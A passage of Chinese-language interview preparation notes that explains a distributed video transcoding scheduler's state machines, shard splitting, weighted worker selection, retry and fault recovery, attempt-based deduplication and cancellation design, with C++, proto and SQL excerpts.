    MarkJobTerminal(job_id, JobStatus::JOB_SUCCESS);
    return true;
}
// 判定 JOB_FAILED：没有进行中的 shard 且至少有一个 FAILED
if (in_progress == 0 && failed_count > 0
    && success_count + failed_count >= expected_shard_count)
{
    MarkJobTerminal(job_id, JobStatus::JOB_FAILED);
    return true;
}
```

**注意 `expected_shard_count` 来自 `JobStore::Get(job_id)->shard_count`**——这是个**独立的校验**。如果只用「本地看到的 shard 数」，在分布式场景下会**过早判成功**（因为本地只看到了一部分 shard）。

**这个校验是踩过坑的**（阶段 4 的 S1）：早期版本用「`1/1 SUCCESS` 就判 job 成功」，结果**并行 shard 的结果被丢弃**。

**面试官想听什么**

- 能画出两个状态机，并说明**为什么没有 MERGING 状态**（同步完成，不值得中间态）
- 知道**枚举值不重排**是为了向后兼容
- 知道 `CheckJobDone` 依赖 `expected_shard_count` 做**独立校验**，以及为什么需要它

**可能追问**

- Q2.2.1 为什么 shard 不直接进 RUNNING，而要经过 ASSIGNED？

#### Q2.2.1 为什么 shard 要有一个 ASSIGNED 状态？

**答**：**ASSIGNED 的设计意图是「分配了但还没开始执行」的观察窗口——用来做超时重扫的区分。我如实说明它的实际使用情况。**

**设计意图**（`common.proto` 的注释）：

```proto
// shard 创建即 WAITING；分配成功即 RUNNING，无独立 ASSIGNED/CREATED 停留
// ASSIGNED 保留作超时重扫的观察窗口
```

**这个「观察窗口」解决什么问题**：

`Scheduler` 的**超时重扫**（每 30 秒）需要区分两种超时，因为它们的**严重程度不同**：

| 状态 | 含义 | 超时阈值 | 处置 |
|---|---|---|---|
| **ASSIGNED 超时** | 分配了但 Worker 迟迟不开始 | **30 秒** | **先 `QueryShard` 二次确认**再判 |
| **RUNNING 超时** | 执行中卡住了 | **5 分钟** | 直接判（远超正常转码时长） |

**为什么 ASSIGNED 要「二次确认」**：因为「分配了却没开始」**不一定是故障**——可能是 Worker 正在处理上一个 shard，或者消息在队列里排队。**先直连 Worker 问一句「你手上有没有这个 shard」，比直接判死更稳。**

**为什么 RUNNING 超时可以「直接判」**（`scheduler_service.cpp` 的注释）：

```cpp
// RUNNING 5 分钟超时本身已是很强的卡死信号（远超正常转码时长）
// 无需 QueryShard 确认，直接：通知原 Worker 取消 + retry 语义修正。
```

**实际使用情况我要说清楚**：**当前的分配路径是「分配成功即写 RUNNING」**，所以 ASSIGNED 这个状态**在正常运行中不会被写入**——它的分支保留了，但没有触发。

**这是个「为将来预留的观察窗口」**。如果要做更精细的调度（比如「分配」和「确认开始」分离），ASSIGNED 就会用上。

**面试官想听什么**

- 能说清 ASSIGNED 的**设计意图**（区分「没开始」和「卡住」两种超时）
- 知道两种超时的阈值差别（30 秒 vs 5 分钟）以及**为什么 ASSIGNED 要二次确认**
- **诚实说明当前不会写入**，但保留分支的意义

## 三、调度策略

### Q3.1 shard 是怎么切分的？

**答（30 秒口述版）**

**先探测真实时长，再按 `shard_duration_sec` 向上取整切分，最后一个 shard 自适应剩余时长。**

`ScheduleJob` 的完整流程（`scheduler_service.cpp:161-251`）：

```cpp
// ① ffprobe 探测真实时长（失败则回退配置值）
auto video_info = FfmpegExecutor::Probe(local_job.input_path);
if (video_info.valid && video_info.duration_ms > 0)
{
    job_duration_ms = video_info.duration_ms;
}
else
{
    int fallback_sec = config.LoadInt("job_duration_fallback_sec", 60, 1, 86400);
    job_duration_ms = static_cast<int64_t>(fallback_sec) * 1000;
}

// ② 每个 shard 的时长：优先用户指定 > 配置默认值
int shard_dur_sec = (local_job.shard_duration_sec > 0)
                    ? local_job.shard_duration_sec
                    : config.LoadInt("shard_duration_sec", 20, 1, 3600);
int64_t shard_duration_ms = static_cast<int64_t>(shard_dur_sec) * 1000;

// ③ 向上取整算 shard 数量
int shard_count = static_cast<int>((job_duration_ms + shard_duration_ms - 1)
                                   / shard_duration_ms);
if (shard_count < 1) shard_count = 1;

// ④ 切分：最后一个 shard 取剩余时长
for (int i = 0; i < shard_count; ++i)
{
    int64_t shard_start = static_cast<int64_t>(i) * shard_duration_ms;
    // 最后一个 shard 时长取剩余部分（可能小于 shard_duration_ms）
    int64_t shard_dur = (i == shard_count - 1)
                        ? (job_duration_ms - shard_start)
                        : shard_duration_ms;
    if (shard_dur <= 0) shard_dur = shard_duration_ms;   // 防御
    ...
}
```

**三个要点**：

**① 向上取整是必须的**（`(a + b - 1) / b`）。**朴素整数除法会丢数据**——阶段 4 的审查里发现过：`50 / 20 = 2`，只创建 2 个 shard，**末尾 10 秒的视频被丢掉了**。改成 `(50+20-1)/20 = 3` 才对。

**② 最后一个 shard 自适应**。60 秒视频、每片 20 秒 → 3 片（20+20+20）；65 秒视频 → 4 片（20+20+20+**5**）。**如果最后一片也固定 20 秒，会请求超出视频长度的区间**——FFmpeg 会输出空文件但退出码是 0，**产生一个「成功但内容为空」的 shard**。

**这个问题真实出现过**（阶段 8 的 #14）：30 秒视频被切成 4 个 shard（因为 `ScheduleJob` 被重复调用），`-ss 45` 超出了视频长度，输出空文件但返回 0。修复方式是「最后一个 shard 取剩余时长」+ 幂等早退。

**③ 时长探测失败要回退**。`Probe` 失败（文件损坏、格式不支持、ffprobe 挂死）时用配置的 `job_duration_fallback_sec`（默认 60 秒）。**回退不是完美的**（切分可能不准），但**比「任务卡住无法调度」好**。

**顺带说 `Probe` 的超时保护**——这是修过 bug 的地方：

```cpp
// #13 修复：read 循环带 poll 超时（此前裸阻塞 read——ffprobe 挂死
// （损坏文件/慢挂载点）会永久阻塞调用方；ScheduleJob 在 work 线程内
// 同步调 Probe，2 个并发即占满线程池瘫痪平台）。超时后 SIGKILL 兜底，
// 返回无效 info 由调用方回退 fallback 时长。
constexpr int     kProbePollMs    = 1000;   // poll 单次超时
constexpr int64_t kProbeTimeoutMs = 15000;  // ffprobe 探测总上限 15s
```

**这个 bug 的严重性值得说**：`ScheduleJob` 在 **work 线程**里同步调 `Probe`，而 work 线程默认只有 **2 个**——**2 个损坏的视频文件就能让整个 Scheduler 瘫痪**。

**面试官想听什么**

- 能说清**向上取整**和**末片自适应**这两个细节，以及不做会出什么问题
- 知道**探测失败要回退**（可用性优先）
- 知道 `Probe` **必须有超时**，以及「2 个并发就瘫痪 work 池」这个量级

### Q3.2 加权评分调度算法是怎么设计的？

**答（30 秒口述版）**

**`score = 空闲槽位 × 10 − CPU 使用率 × 0.5 − 内存使用率 × 0.2`，取分最高的 Worker。**

```cpp
// scheduler_service.cpp:861-884
// 加权评分选择 Worker
// score = available_slots * 10 - cpu_usage * 0.5 - memory_usage * 0.2
// 空闲槽位越多、负载越低的 Worker 得分越高
const WorkerInfo* best_worker = nullptr;
double best_score = -999.0;

for (const auto& w : workers.workers())
{
    // round_assigned 本回合已分配计数（防同一轮对同一 Worker 超额分配）
    int already = round_assigned[w.worker_id()];
    int available = w.max_running_shards()
                  - w.current_running_shards()
                  - already;
    if (available <= 0) continue;      // 无空槽位，跳过

    double score = available * 10.0
                 - w.cpu_usage() * 0.5
                 - w.memory_usage() * 0.2;

    if (score > best_score)
    {
        best_score = score;
        best_worker = &w;
    }
}
```

**三个系数的设计依据**：

| 项 | 系数 | 含义 |
|---|---|---|
| `available`（空闲槽位） | **×10** | 1 个空槽 = 10 分，**主导项** |
| `cpu_usage`（0~100） | **×−0.5** | CPU 跑满 = 惩罚 50 分 = **相当于 −5 个空槽** |
| `memory_usage`（0~100） | **×−0.2** | 内存跑满 = 惩罚 20 分 = **相当于 −2 个空槽** |

**为什么 CPU 权重比内存高**：**因为转码是 CPU 密集型任务**。一个 CPU 已经 90% 的 Worker，再给它任务只会让所有任务都变慢；而内存占用高一些（比如 70%）对转码的影响相对小。**权重反映了「这个资源对转码的影响程度」。**

**为什么是线性而不是更复杂的函数**：**可解释性和可调性**。线性权重下，「调整一个系数会发生什么」是可以推理的；而且出问题时能一眼看出「为什么选了这个 Worker」——我甚至在日志里打了分数（`best_score` 在 `scheduler_service.cpp:1033` 被记录）。

**关键细节一：`round_assigned` 是本轮的本地账本。**

**为什么需要它**：`ListWorkers` 返回的 `current_running_shards` 是**一个静态快照**——在**整个轮次内不会变**（因为它来自 MySQL，只在心跳时更新）。

所以如果一轮里有 5 个 WAITING shard，每个都去看快照：

```text
shard_1 → Worker A 有 4 个空槽 → 选 A
shard_2 → Worker A 还是有 4 个空槽（快照没变！）→ 又选 A
...
shard_5 → 全给 A 了 → 超额分配！
```

**这就是阶段 4 审查里发现的 #6「Worker 超额分配」**——「同轮重复分配 5 个 shard 给 1 个 4 槽 Worker」。

**修复就是 `round_assigned`**：每分配一次就 +1，下次算 `available` 时扣掉。

```cpp
// 本地槽位记账
round_assigned[best_worker->worker_id()]++;
```

**关键细节二：`if (available <= 0) continue;` 是 Scheduler 侧的软保护。**

Worker 侧还有**硬拒绝**（`transcode_worker.cpp:137-159`）：

```cpp
int max_shards = MprpcApplication::GetConfig().LoadInt("max_running_shards", 2, 1, 1024);
int current_cpu = CollectCpuUsage();
// 负载过高，不进行分配
if (running >= max_shards || current_cpu > 90)
{
    LOG_WARN("WorkerService::AssignShard shard %s rejected: overloaded "
             "(running=%d/%d, cpu=%d%%)", ...);
    response->set_error_code(2);
    response->set_error_msg("worker overloaded");
    return;
}
```

**为什么两层都要**：
- **Scheduler 侧**是「尽量别选过载的」——**软保护**，基于可能陈旧的数据（心跳 3 秒一次，所以最多 3 秒延迟）；
- **Worker 侧**是「真的不能再接了」——**硬保护**，基于自己的实时状态。

**Worker 侧是唯一能防住「Scheduler 快照陈旧」的防线**。假设某个 Worker 在这 3 秒内接了别的任务（或者 CPU 突然飙到 95%），Scheduler 的快照还是旧的——它会继续分配，而 Worker 会拒绝。

**⚠️ 这里有个细节我要说明**：Worker 侧返回的是 `error_code = 2`，**这不是标准的 RPC 错误码**（不是那 15 个之一）。它是业务自定义的「overloaded」信号。Scheduler 收到后应该**换一个 Worker 重试**——我需要确认这个重试逻辑存在，否则这个 shard 会分配失败。

**面试官想听什么**

- 能解释**系数的含义**（1 空槽 = 10 分，CPU 满 = −50 分 = −5 槽）以及为什么 CPU 权重大于内存
- 能说清 `round_assigned` 解决的**具体问题**（快照在一轮内不变 → 超额分配）
- 知道**两层保护**的分工（Scheduler 软、Worker 硬），以及「Worker 侧是唯一防住快照陈旧的防线」

**可能追问**

- Q3.2.1 那 shard 的优先级是怎么排的？

#### Q3.2.1 那 shard 的优先级是怎么排的？

**答**：**按 job 的 `priority` 降序，同优先级按 `created_at` 升序（FIFO）——防饥饿。**

```cpp
// scheduler_service.cpp:1545-1566
// 按优先级排序 WAITING shard
// priority 越大越优先，同优先级按创建时间 FIFO
// 批量查询 job 优先级并缓存，避免 N 次 JobStore::Get
std::unordered_map<std::string, int32_t> job_priority_cache;
for (const auto& s : waiting_shards)
{
    if (job_priority_cache.find(s.job_id) == job_priority_cache.end())
    {
        auto job_opt = JobStore::GetInstance().Get(s.job_id);
        job_priority_cache[s.job_id] = job_opt.has_value() ? job_opt->priority : 0;
    }
}
std::sort(waiting_shards.begin(), waiting_shards.end(),
          [&job_priority_cache](const ShardRecord& a, const ShardRecord& b) {
              int pa = job_priority_cache[a.job_id];
              int pb = job_priority_cache[b.job_id];
              if (pa != pb) return pa > pb;                  // 高优先级在前
              return a.created_at < b.created_at;            // 同优先级 FIFO
          });
```

**三个设计点**：

**① **`priority` 不在 shard 表里，而是从 job 反查的**。

`ShardRecord` **没有 `priority` 字段**——因为优先级是**任务级别**的属性，不是 shard 级别的。如果每个 shard 都存一份，改 job 优先级时要更新所有 shard，**数据冗余 + 不一致风险**。

反查的代价是「每个 shard 一次 `JobStore::Get`」。

**② 但反查被 `job_priority_cache` 优化了**。

同一个 job 的多个 shard 会**命中缓存**——所以实际查询次数是「**distinct job 数**」而不是「shard 数」。

假设 10 个 job、每个 5 个 shard（50 个 shard）：
- 不缓存：50 次数据库查询；
- 缓存：**10 次**。

**在每 2 秒一轮的调度循环里，这个差别很可观。**

**③ 同优先级按 `created_at` FIFO 防饥饿**。

**这是个容易被忽略但很重要的设计**。如果只按 priority 排、同优先级顺序不确定（比如按 `unordered_map` 的遍历顺序），那么**某些 job 可能永远排在后面**——尤其是当高优先级任务持续提交时。

**FIFO 保证「先来的先被调度」**，所以每个 job 都有一个**最坏等待时间上界**。

**`priority` 的来源**：`JobInfo.priority`（proto 字段 9），用户提交时指定。缺 job 时默认 **0**。

**面试官想听什么**

- 能说清「priority 在 job 上不在 shard 上」的**数据建模理由**（避免冗余和不一致）
- 知道 `job_priority_cache` 把查询次数从「shard 数」降到「job 数」
- 知道 **FIFO 是防饥饿**的设计，不是随意的

## 四、失败重试与故障恢复

### Q4.1 失败重试是怎么做的？

**答（30 秒口述版）**

**ResultCollector 发现 shard 失败后，主动调 Scheduler.RescheduleShard 触发重试；重试次数上限 3。**

**为什么是 RC 触发重试**（`doc/更新业务日志/5.` 的设计说明）：

> RC 是发现 FAILED 的第一站，立即触发重试延迟最小。

**RC 是唯一知道「shard 失败了」的服务**——Worker 把结果直接报给 RC（要么走 MQ 要么直连 RPC），所以**在 RC 里触发重试没有额外的消息传递**。

**重试逻辑**（`scheduler_service.cpp:413-435`）：

```cpp
// 未超次：增加重试计数，重置为 WAITING
int from_status = shard.status;       // 快照前置状态（条件更新防覆盖）
shard.retry_count++;

// shard 重试观测（重试计数每次 +1 都记录）
mprpc::MetricsRegistry::GetInstance()
    .Counter("shard_retry_total", "shard 重试总次数").Inc();

shard.status = static_cast<int32_t>(ShardStatus::SHARD_RETRYING);
shard.assigned_worker_id.clear();
shard.attempt_id.clear();
shard.updated_at = NowMs();
ShardStore::GetInstance().UpdateIfStatus(shard_id, {from_status}, shard);
...
// 立即转为 WAITING，让 SchedulingLoop 下一轮扫描时分配
shard.status = static_cast<int32_t>(ShardStatus::SHARD_WAITING);
ShardStore::GetInstance().UpdateIfStatus(
    shard_id, {static_cast<int32_t>(ShardStatus::SHARD_RETRYING)}, shard);

NotifyShardWaiting(shard_id);       // 发 MQ 事件，立即重新分配
```

**注意 RETRYING 是个「瞬时中间态」**：两次条件更新——先写 RETRYING，立刻再写 WAITING。

**为什么要经过 RETRYING 而不是直接写 WAITING**：

**因为 `RETRYING` 和 `WAITING` 的语义不同**：
- `WAITING` = 「等着被分配」；
- `RETRYING` = 「正在重试中」。

**关键在于 `CheckJobDone` 的判定逻辑**——如果一个 shard 在重试中，它不应该被算作「失败」，也不应该被算作「等待」：

```cpp
// result_collector.cpp 的循环分类
success_count / failed_count（含 CANCELED）/ in_progress
```

**`in_progress` 包含 `RETRYING`**——所以 job 不会因为「一个 shard 正在重试」而被过早判失败。

**阶段 5 修过这个 bug**：

> **FAILED 后本地状态未更新导致过早 JOB_FAILED**：本地保持 FAILED、重试结果未到 → 判 FAILED。修复：`RescheduleShard` 成功后本地改 `SHARD_RETRYING` 告知 `CheckJobDone` 重试进行中。

**「重试中的 shard 不能被判定为失败」**这个语义，就是 RETRYING 存在的理由。

**重试次数上限**：`max_retry = 3`（切分时硬编码，`scheduler_service.cpp:229`）。判定是 `retry_count >= max_retry`。

**`retry_count++` 出现在 4 个地方**：

| 触发场景 | 说明 |
|---|---|
| `RescheduleShard` | RC 上报 FAILED 后主动触发（**主路径**） |
| `NotifyWorkerOffline` | Worker 心跳超时，把它的 shard 重置 |
| SchedulingLoop ASSIGNED 卡死 | 30 秒超时 + QueryShard 二次确认后判定 |
| SchedulingLoop RUNNING 超时 | 5 分钟超时直接判定 |

**四条路径都做同一件事**：`retry_count++` → 重置为 WAITING → `NotifyShardWaiting` 发 MQ 事件。**复用同一套分配逻辑**（`TryAssignShard`），所以「不同故障来源的 shard 走完全相同的调度流程」。

**为什么重试时要 `retry_count++` 而不是保持不变**——这是**幂等的关键**（Q4.3 详述）：`retry_count` 变了，`attempt_id` 就变了，**旧执行的结果会自动被 RC 拒绝**。

**面试官想听什么**

- 能说清「为什么是 RC 触发重试」（它是发现失败的第一站，无额外消息传递）
- 能说清 **RETRYING 为什么必要**（区分「重试中」和「等待中」，防止过早判 job 失败）
- 知道 **4 条重试路径复用同一套分配逻辑**

**可能追问**

- Q4.1.1 重试耗尽了会怎样？

#### Q4.1.1 重试耗尽了会怎样？

**答**：**两种终态，取决于「为什么重试耗尽」——这是刻意的区分。**

| 触发场景 | 终态 | 语义 |
|---|---|---|
| **执行失败**（`RescheduleShard` / `NotifyWorkerOffline`） | **`SHARD_FAILED`** | 业务失败——转码真的跑不起来 |
| **卡死超时**（SchedulingLoop 的两条路径） | **`SHARD_CANCELED`** | 系统放弃——不一定是业务问题 |

**设计依据**（`doc/设计问题/业务/5. 超时重扫设计.md`）：

> 「卡死取消」（系统放弃），不是「转码失败」（业务失败）。

**这个区分有实际意义**：
- `SHARD_FAILED` 意味着「这个视频/参数组合转不了」——**重试也没用**，应该让用户看到失败原因；
- `SHARD_CANCELED` 意味着「系统认为它卡住了所以放弃」——**可能是环境问题**（机器负载高、临时故障），不代表任务本身有问题。

**⚠️ 这里有个我要如实说明的点**：两条路径**耗尽后的处置不完全一致**。

**执行失败路径**会调 `CheckAndMarkJobFailed`：

```cpp
// RescheduleShard / NotifyWorkerOffline 里
if (shard.retry_count >= shard.max_retry)
{
    shard.status = static_cast<int32_t>(ShardStatus::SHARD_FAILED);
    ...
    CheckAndMarkJobFailed(shard.job_id);
}
```

而 `CheckAndMarkJobFailed`（`scheduler_service.cpp:693-733`）的判定是「**`any_failed && all_terminal`**」——它**只认 SUCCESS / FAILED / CANCELED 里的 FAILED** 来置 `any_failed`。

**所以「卡死超时耗尽」这条路径**：shard 变成 CANCELED、`any_failed` 保持 false → **job 不会进 JOB_FAILED**。

**这个行为的影响**：任务会停在 RUNNING 状态，直到 `TerminalSweepLoop`（15 秒一轮）来兜底——它检查「所有 shard 都是终态」然后调 `CheckJobDone`。而 `CheckJobDone` 里：

```cpp
if (in_progress == 0 && failed_count > 0 && ...) → JOB_FAILED
```

`failed_count` 包含 CANCELED（注释写着「含 CANCELED」），所以**最终会判 JOB_FAILED**，只是要等 `TerminalSweepLoop` 走一遍。

**所以实际结果是正确的，只是路径绕了一圈。** 如果要更直接，应该在「卡死超时耗尽」时也调一次 `CheckAndMarkJobFailed`。

**面试官想听什么**

- 能说清「系统放弃（CANCELED）vs 业务失败（FAILED）」这个**语义区分**及其意义
- 知道两条路径的**最终收敛结果是一致的**（都进 JOB_FAILED），但路径长短不同

### Q4.2 四类故障分别是怎么恢复的？

**答（30 秒口述版）**

**五类故障，最终都收敛到「shard 重置为 WAITING 重新调度」——复用同一套分配逻辑。**

| 故障 | 检测机制 | 恢复动作 |
|---|---|---|
| **执行失败**（FFmpeg 返回非 0） | RC 收到 `is_success=false` | `RescheduleShard` → 重试 |
| **Worker 进程退出** | WM 心跳超时（20 秒）→ 标 OFFLINE → 通知 Scheduler | `NotifyWorkerOffline` → 重置该 Worker 的 shard |
| **执行卡死** | SchedulingLoop 超时重扫（30 秒一轮） | 30 秒（ASSIGNED）/ 5 分钟（RUNNING）判定 → 重置 |
| **结果上报失败** | Worker 侧发送失败 | 进 `pending_reports_` 队列，**心跳线程每 3 秒兜底重试** |
| **Scheduler 崩溃重启** | 启动恢复扫描 | 把残留的 ASSIGNED/RUNNING 全扫回 WAITING |

**逐个展开**：

**① 执行失败**：FFmpeg 退出码非 0 → Worker 上报 `is_success=false` → RC 收到后调 `RescheduleShard`。

**② Worker 进程退出**：这是**分布式系统最经典的问题**——进程死了，它**没机会做任何清理**。

检测机制是**心跳超时**：

```cpp
// worker_manager.cpp
constexpr int64_t kHeartbeatTimeoutMs = 20000;   // 20 秒
constexpr int64_t kCheckIntervalMs = 2000;       // 2 秒扫一次
```

**为什么是 20 秒**（阶段 8 的 #12）：

> 心跳超时 10s → 20s：网络抖动被当成执行失败 → 虚假重调度 + 不向旧 Worker 发取消 → 同 shard 双份转码、重试预算被抖动白白消耗。**20s ≈ 两个完整心跳周期**。

**离线判定用的是单条条件 SQL**（`common_store.cpp`）：

```sql
UPDATE workers SET status=OFFLINE
WHERE worker_id=?
  AND status=ONLINE
  AND last_heartbeat < (now - timeout_ms)
```

**这个设计消除 TOCTOU**：如果先查「是否超时」再「更新为 OFFLINE」，两次操作之间有窗口（Worker 可能刚好发了心跳）。**合并成一条带条件的 UPDATE，由 MySQL 行级原子性保证互斥**——和 `UpdateHeartbeat` 天然互斥。

**③ 执行卡死**：这是个**比「进程退出」更难的问题**——进程还活着、心跳还在发，但任务卡住了。

**关键是「怎么判断卡死」**。这里有段我比较满意的设计——`progress_watch_` 记账本：

**ASSIGNED 超时 ≠ 卡死**（`scheduler_service.cpp` 的注释）

> 正常 Worker 从不向 Scheduler 报进度，慢视频 30s 没动静完全正常——**先直连原 Worker `QueryShard` 确认**。

四种结果的处置：

| QueryShard 返回 | 处置 |
|---|---|
| 已不持有该 shard | 等结果（可能刚完成） |
| **进度前进** | **刷新观察窗**（`updated_at` 续命） |
| **进度停滞 < 2 轮** | 再观察一轮 |
| **停滞 ≥ 2 轮 / RPC 连挂 2 轮** | 判卡死 |

**为什么要「连续 2 轮」**（`doc/设计问题/业务/5.`）：

> 1 次停滞就判死会误杀慢任务。

**代价**：卡死检测最长延迟 ~90 秒。

**`progress_watch_` 记账本的作用**：Scheduler 的 30 秒超时重扫是「**无记忆**」的（每轮独立扫描）。要区分「刚停下来」和「停了 1 分钟」，就必须**记住上一轮看到的进度**——`progress_watch_` 就是这个记忆。

**这个设计很关键**：没有它，重扫只能在两个坏选择里选——要么「一超时就判死」（误杀慢任务），要么「永远不判」（真的卡死了也不管）。

**④ 结果上报失败**：Worker 上报结果时 MQ 和 RPC 都失败——结果不能丢。

**三级降级链**：

```cpp
// transcode_worker.cpp:395-430
bool result_reported = false;
// ① MQ 优先（publish 成功即已投递）
if (TryPublishResultToMq(result_req)) { result_reported = true; }

// ② RPC 重试 3 次
for (int retry = 0; retry < 3 && !result_reported; ++retry)
{
    if (retry > 0) std::this_thread::sleep_for(std::chrono::seconds(1));
    rc_stub.ReportShardResult(&ctrl, &result_req, &result_resp, nullptr);
    if (!ctrl.Failed() && result_resp.accepted()) { result_reported = true; }
}

// ③ 全失败 → 进 pending_reports_ 队列，心跳线程兜底重试
```

**心跳线程每 3 秒调一次 `RetryPendingReports`**——**借心跳当兜底重试通道**。

**这里有个很关键的设计**（`transcode_worker.cpp:531-546`）：

```cpp
else if (!ctrl.Failed())
{
    // 确定性拒绝（accepted=false，如 stale attempt——shard 已被重调度到更高 attempt，
    // 旧结果永远不可能被接受）直接丢弃，此前无差别重入队导致 3s 间隔无限重试 + WARN 刷屏。
    LOG_WARN("RetryPendingReports: shard=%s deterministically rejected, "
             "dropping entry: %s", pr.shard_id.c_str(), resp.error_msg().c_str());
}
else
{
    // 仅网络失败才放回队列等待下次心跳
    std::lock_guard<std::mutex> lock(pending_mutex_);
    pending_reports_.push_back(pr);
}
```

**「网络失败 vs 确定性拒绝」的二分**：
- **网络失败**（`ctrl.Failed()`）→ 放回队列，可能下次就通了；
- **确定性拒绝**（`accepted=false`，比如 stale attempt）→ **直接丢弃**，因为**重试多少次结果都一样**。

**不加这个区分会怎样**：stale 的结果每 3 秒被重试一次，**永远失败、永远重试**——日志被刷屏，而且队列无限增长。

**⑤ Scheduler 崩溃重启**：**这是最容易被忽略的故障**——因为 Scheduler 重启后，它**不知道自己崩溃前在做什么**。

**问题**（`scheduler_service.cpp:1059-1116` 的注释）：

```cpp
// 场景：Scheduler 进程崩溃（kill -9、OOM、段错误），然后被监控系统重启。
// 重启后 SchedulingLoop 只扫描 WAITING 状态，这些 shard 永远不会被重新调度——成为永久的"孤儿 shard"。
```

**修复是「启动恢复扫描」**：Scheduler 起来后，`SchedulingLoop` 起手把残留的 ASSIGNED / RUNNING 全部扫回 WAITING。

**注意这要求 shard 状态是持久化的**——这正是阶段 9 用 MySQL 替代内存 Store 的价值：**崩溃重启后状态还在**。

**面试官想听什么**

- 能列出**五类故障**并说清各自的检测机制和恢复动作
- 能说清「**所有恢复路径都收敛到 WAITING + 复用同一套分配逻辑**」这个设计原则
- 知道 **`progress_watch_` 记账本**解决的「无记忆重扫」问题
- 知道「**网络失败 vs 确定性拒绝**」的二分

**可能追问**

- Q4.2.1 这些恢复动作会不会导致「同一份工作做两遍」？

#### Q4.2.1 这些恢复动作会不会导致「同一份工作做两遍」？

**答**：**会——这是必然的，而且我做了三层防护让「重复执行」不会变成「重复生效」。**

**为什么必然**：分布式系统里，**「某个节点失联」和「某个节点在正常工作只是消息没传回来」是无法区分的**（这是 FLP 不可能性的一种体现）。

具体场景：

```text
[t0]  Scheduler 把 shard 分配给 Worker A
[t10] Worker A 因为 GC/网络分区，20 秒没发心跳
[t30] WM 判定 A 离线 → 通知 Scheduler → shard 重置为 WAITING
[t31] Scheduler 分配给 Worker B
[t32] Worker A「复活」，继续执行它的那份 —— 但它还在跑！
```

**结果**：Worker A 和 Worker B **同时在转码同一个 shard**。这是**真实的浪费**（双份 CPU），但**我选择接受它**——因为：

**「宁可做两遍，不可漏做一遍」**。如果为了「绝不重复」而延迟检测（比如等 5 分钟才判定离线），那真正的故障恢复时间也会变成 5 分钟。

**三层防护让「重复执行」不产生「重复生效」**：

**第一层：`attempt_id` 拒绝旧代次的结果。**

```cpp
// result_collector.cpp
int stored_retry   = parseRetryFromAttempt(shard.attempt_id);
int incoming_retry = parseRetryFromAttempt(attempt_id);
if (!shard.attempt_id.empty() && incoming_retry < stored_retry)
{
    response->set_accepted(false);   // ← Worker A 的旧结果被拒绝
    return;
}
```

Worker A 的 `attempt_id` 是 `shard_0_attempt_0`，而 shard 现在已经是 `shard_0_attempt_1`——**A 的结果被直接丢弃**。

**第二层：`CancelShard` 带 attempt 校验，防止误杀新执行。**

```proto
// worker.proto:96 的注释
// 「非空时仅取消『当前正执行该 attempt』的 shard……
//   空字符串 = 取消该 shard 任意 attempt（CancelJobShards 用户取消场景，兼容）」
```

**这里的区分很精妙**：
- **超时重扫**的取消**带** `attempt_id`——意图是「取消卡死的**旧**执行，保留新执行」。不带的话会把新 attempt 一起杀掉，**形成死循环式浪费**；
- **用户取消**的取消**不带** `attempt_id`——因为 job 已经取消了，**所有执行（包括重分配后的新 attempt）都该停**。

**`attempt_id` 是手段，意图是目的。**

**第三层：分布式锁 + MySQL 条件更新，防止「同一时刻两个调度者分配同一个 shard」。**

```cpp
// 分布式锁：SETNX shard:lock:{shard_id} EX 10
// 兜底：UpdateIfStatus(id, {WAITING}, ...) 的条件更新
```

**三层的关系**：

| 层 | 防什么 | 失效会怎样 |
|---|---|---|
| 分布式锁 | 同一时刻重复分配 | 两个调度者分配同一 shard |
| **MySQL 条件更新** | （同上，兜底） | 状态被覆盖 |
| **`attempt_id`** | 旧执行结果干扰新执行 | **结果错乱** |

**最重要的是第三层（`attempt_id`）**——因为前两层防的是「分配阶段」，而 `attempt_id` 防的是「执行结果的最终生效」。

**即使前两层全部失效**（Redis 挂了、MySQL 条件更新因为网络问题返回了错误的成功），**只要 `attempt_id` 校验还在，最终生效的结果就只有一个**。

**面试官想听什么**

- 能说清「**失联和正常工作无法区分**」这个分布式系统的本质限制
- 能说出「**宁可做两遍，不可漏做一遍**」这个取舍，以及为什么
- 能说清**三层防护**各自的防护点，并指出 `attempt_id` 是最后也最重要的一层
- 能说清「**超时重扫带 attempt_id、用户取消不带**」的意图区分

### Q4.3 取消链路是怎么设计的？

**答（30 秒口述版）**

**两层哲学：状态保证是强保证，执行保证是 best-effort。**

**① 状态保证（强保证）——用 MySQL CAS 做，单条原子更新。**

`JobService::CancelJob`：

```cpp
// 1. 条件推进 job → CANCELED
int from_status = job_opt->status;
job.status = static_cast<int32_t>(JobStatus::JOB_CANCELED);
JobStore::GetInstance().UpdateIfStatus(job_id, {from_status}, job);

// 2. 把所有非终态 shard 标记为 CANCELED
for (auto& s : shards)
{
    if (st == SHARD_SUCCESS || st == SHARD_FAILED || st == SHARD_CANCELED) continue;
    int from_status = st;
    s.status = s_canceled;
    s.updated_at = NowMs();
    ShardStore::GetInstance().UpdateIfStatus(s.shard_id, {from_status}, s);
    ++canceled_count;
}
```

**这一步是「强保证」**：
- **单条 `UPDATE` 原子生效**，没有网络依赖；
- 一旦完成，**这些 shard 永远不会再被调度**（`SchedulingLoop` 只扫 `WAITING`，而它们已经是 `CANCELED`）；
- 也**永远不会被合并产出成品**。

**② 执行保证（best-effort）——通知 Worker 停掉正在跑的转码。**

```cpp
// 3. 委托 Scheduler 向 Worker 传播
SchedulerService_Stub::CancelJobShards(job_id, reason);   // 超时 5 秒
```

**`CancelJobShards` 的实现原则**（`scheduler.proto:70` 的注释）：

```proto
// 本 RPC 永远返回 error_code=0 —— 调用方不应将 worker 通知失败视为 CancelJob 失败
```

**为什么是 best-effort 而不是强保证**：

**因为「停掉一个正在运行的 FFmpeg 进程」本质上做不到 100% 可靠**——Worker 可能已经崩了、网络可能不通、Worker 可能正在 fork 子进程的中间态。

**如果要求「取消必须停掉执行」，那取消就变成了一个可能失败的、需要重试的、跨多个服务的分布式事务。** 这会把取消的复杂度提高一个量级。

**而且——** **「停不掉」的后果是可以接受的**：

> 最坏情况 = 已经启动的转码跑完、产出被丢弃——**但取消后任务永远不会再被调度、被重试、被合并产出成品**。

**这就是「状态保证 vs 执行保证」的分层**：

| 保证 | 手段 | 可靠性 | 失败的后果 |
|---|---|---|---|
| **状态保证** | MySQL CAS | **强**（单条原子 UPDATE） | —— |
| **执行保证** | RPC + SIGTERM | **best-effort** | 多烧一点 CPU，但结果被丢弃 |

**③ 执行层怎么做到「尽快停」——`CancelShard` 只置标志，不直接 kill。**

```cpp
// transcode_worker.cpp:212-227
// CancelShard 校验 attempt 后：
running_shard->cancelled = true;      // std::atomic<bool>，仅此而已
```

**为什么不直接 kill**（`doc/设计问题/业务/9.`）：

